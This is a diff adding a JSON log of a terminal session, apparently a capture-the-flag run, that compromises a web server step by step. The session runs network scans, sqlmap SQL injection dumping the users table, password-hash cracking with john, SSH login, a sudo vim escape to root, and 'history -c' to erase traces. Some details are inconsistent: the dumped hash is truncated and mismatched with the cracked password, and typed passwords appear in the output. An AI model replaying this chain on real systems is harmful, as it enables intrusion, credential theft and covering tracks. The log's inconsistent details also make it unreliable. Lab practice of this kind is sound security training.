@@ -1,0 +1,358 @@
+[
+    {
+        "type": "input",
+        "text": "whoami"
+    },
+    {
+        "type": "output",
+        "text": "kali"
+    },
+    {
+        "type": "input",
+        "text": "pwd"
+    },
+    {
+        "type": "output",
+        "text": "/home/kali"
+    },
+    {
+        "type": "input",
+        "text": "ifconfig"
+    },
+    {
+        "type": "output",
+        "text": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500"
+    },
+    {
+        "type": "output",
+        "text": "        inet 192.168.1.105  netmask 255.255.255.0  broadcast 192.168.1.255"
+    },
+    {
+        "type": "input",
+        "text": "nmap -sn 192.168.1.0/24"
+    },
+    {
+        "type": "output",
+        "text": "Starting Nmap 7.94 ( https://nmap.org )"
+    },
+    {
+        "type": "output",
+        "text": "Nmap scan report for 192.168.1.1"
+    },
+    {
+        "type": "output",
+        "text": "Host is up (0.001s latency)."
+    },
+    {
+        "type": "output",
+        "text": "Nmap scan report for 192.168.1.50"
+    },
+    {
+        "type": "output",
+        "text": "Host is up (0.023s latency)."
+    },
+    {
+        "type": "output",
+        "text": "Nmap scan report for 192.168.1.100"
+    },
+    {
+        "type": "output",
+        "text": "Host is up (0.015s latency)."
+    },
+    {
+        "type": "input",
+        "text": "nmap -sS -O 192.168.1.100"
+    },
+    {
+        "type": "output",
+        "text": "Starting Nmap 7.94"
+    },
+    {
+        "type": "output",
+        "text": "PORT     STATE SERVICE"
+    },
+    {
+        "type": "output",
+        "text": "22/tcp   open  ssh"
+    },
+    {
+        "type": "output",
+        "text": "80/tcp   open  http"
+    },
+    {
+        "type": "output",
+        "text": "443/tcp  open  https"
+    },
+    {
+        "type": "output",
+        "text": "3306/tcp open  mysql"
+    },
+    {
+        "type": "output",
+        "text": "OS: Linux 3.X|4.X"
+    },
+    {
+        "type": "input",
+        "text": "curl -I http://192.168.1.100"
+    },
+    {
+        "type": "output",
+        "text": "HTTP/1.1 200 OK"
+    },
+    {
+        "type": "output",
+        "text": "Server: Apache/2.4.41 (Ubuntu)"
+    },
+    {
+        "type": "output",
+        "text": "X-Powered-By: PHP/7.4.3"
+    },
+    {
+        "type": "input",
+        "text": "nikto -h http://192.168.1.100"
+    },
+    {
+        "type": "output",
+        "text": "+ Server: Apache/2.4.41 (Ubuntu)"
+    },
+    {
+        "type": "output",
+        "text": "+ Retrieved x-powered-by header: PHP/7.4.3"
+    },
+    {
+        "type": "output",
+        "text": "+ OSVDB-3268: /admin/: Directory indexing found."
+    },
+    {
+        "type": "output",
+        "text": "+ OSVDB-3092: /admin/: This might be interesting..."
+    },
+    {
+        "type": "input",
+        "text": "dirb http://192.168.1.100 /usr/share/dirb/wordlists/common.txt"
+    },
+    {
+        "type": "output",
+        "text": "---- Scanning URL: http://192.168.1.100/ ----"
+    },
+    {
+        "type": "output",
+        "text": "+ http://192.168.1.100/admin (CODE:200|SIZE:1234)"
+    },
+    {
+        "type": "output",
+        "text": "+ http://192.168.1.100/backup (CODE:200|SIZE:0)"
+    },
+    {
+        "type": "output",
+        "text": "+ http://192.168.1.100/config (CODE:403|SIZE:277)"
+    },
+    {
+        "type": "input",
+        "text": "curl http://192.168.1.100/admin"
+    },
+    {
+        "type": "output",
+        "text": "<title>Admin Login</title>"
+    },
+    {
+        "type": "output",
+        "text": "<form action='login.php' method='post'>"
+    },
+    {
+        "type": "input",
+        "text": "sqlmap -u 'http://192.168.1.100/login.php' --data 'user=admin&pass=test' --dbs"
+    },
+    {
+        "type": "output",
+        "text": "available databases [3]:"
+    },
+    {
+        "type": "output",
+        "text": "[*] information_schema"
+    },
+    {
+        "type": "output",
+        "text": "[*] mysql"
+    },
+    {
+        "type": "output",
+        "text": "[*] webapp_db"
+    },
+    {
+        "type": "input",
+        "text": "sqlmap -u 'http://192.168.1.100/login.php' --data 'user=admin&pass=test' -D webapp_db --tables"
+    },
+    {
+        "type": "output",
+        "text": "Database: webapp_db"
+    },
+    {
+        "type": "output",
+        "text": "[2 tables]"
+    },
+    {
+        "type": "output",
+        "text": "+-------+"
+    },
+    {
+        "type": "output",
+        "text": "| users |"
+    },
+    {
+        "type": "output",
+        "text": "| logs  |"
+    },
+    {
+        "type": "output",
+        "text": "+-------+"
+    },
+    {
+        "type": "input",
+        "text": "sqlmap -u 'http://192.168.1.100/login.php' --data 'user=admin&pass=test' -D webapp_db -T users --dump"
+    },
+    {
+        "type": "output",
+        "text": "+----+----------+----------------------------------+"
+    },
+    {
+        "type": "output",
+        "text": "| id | username | password                         |"
+    },
+    {
+        "type": "output",
+        "text": "+----+----------+----------------------------------+"
+    },
+    {
+        "type": "output",
+        "text": "| 1  | admin    | 5e884898da28047151d0e56f8dc629... |"
+    },
+    {
+        "type": "output",
+        "text": "| 2  | user     | ef92b778bafe771e89245b89ecbc08... |"
+    },
+    {
+        "type": "output",
+        "text": "+----+----------+----------------------------------+"
+    },
+    {
+        "type": "input",
+        "text": "echo '5e884898da28047151d0e56f8dc6292773b4da6aae' > hash.txt"
+    },
+    {
+        "type": "input",
+        "text": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
+    },
+    {
+        "type": "output",
+        "text": "Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])"
+    },
+    {
+        "type": "output",
+        "text": "hello123         (admin)"
+    },
+    {
+        "type": "input",
+        "text": "ssh admin@192.168.1.100"
+    },
+    {
+        "type": "output",
+        "text": "admin@192.168.1.100's password: hello123"
+    },
+    {
+        "type": "output",
+        "text": "Welcome to Ubuntu 20.04.3 LTS"
+    },
+    {
+        "type": "input",
+        "text": "id"
+    },
+    {
+        "type": "output",
+        "text": "uid=1001(admin) gid=1001(admin) groups=1001(admin)"
+    },
+    {
+        "type": "input",
+        "text": "sudo -l"
+    },
+    {
+        "type": "output",
+        "text": "[sudo] password for admin: hello123"
+    },
+    {
+        "type": "output",
+        "text": "User admin may run the following commands:"
+    },
+    {
+        "type": "output",
+        "text": "    (ALL : ALL) /usr/bin/vim"
+    },
+    {
+        "type": "input",
+        "text": "sudo vim -c ':!/bin/bash'"
+    },
+    {
+        "type": "input",
+        "text": "id"
+    },
+    {
+        "type": "output",
+        "text": "uid=0(root) gid=0(root) groups=0(root)"
+    },
+    {
+        "type": "input",
+        "text": "cd /root"
+    },
+    {
+        "type": "input",
+        "text": "ls -la"
+    },
+    {
+        "type": "output",
+        "text": "total 32"
+    },
+    {
+        "type": "output",
+        "text": "drwx------  4 root root 4096 Jan 15 10:30 ."
+    },
+    {
+        "type": "output",
+        "text": "drwxr-xr-x 20 root root 4096 Jan 10 09:15 .."
+    },
+    {
+        "type": "output",
+        "text": "-rw-------  1 root root  220 Jan 10 09:15 .bash_logout"
+    },
+    {
+        "type": "output",
+        "text": "-rw-------  1 root root 3526 Jan 10 09:15 .bashrc"
+    },
+    {
+        "type": "output",
+        "text": "drwx------  2 root root 4096 Jan 15 10:25 .ssh"
+    },
+    {
+        "type": "output",
+        "text": "-rw-------  1 root root  161 Jan 10 09:15 .profile"
+    },
+    {
+        "type": "output",
+        "text": "-rw-------  1 root root 1024 Jan 15 10:30 flag.txt"
+    },
+    {
+        "type": "input",
+        "text": "cat flag.txt"
+    },
+    {
+        "type": "output",
+        "text": "CTF{c0ngr4tul4t10ns_y0u_h4v3_r00t3d_th3_s3rv3r!}"
+    },
+    {
+        "type": "input",
+        "text": "history -c"
+    },
+    {
+        "type": "input",
+        "text": "exit"
+    }
+]
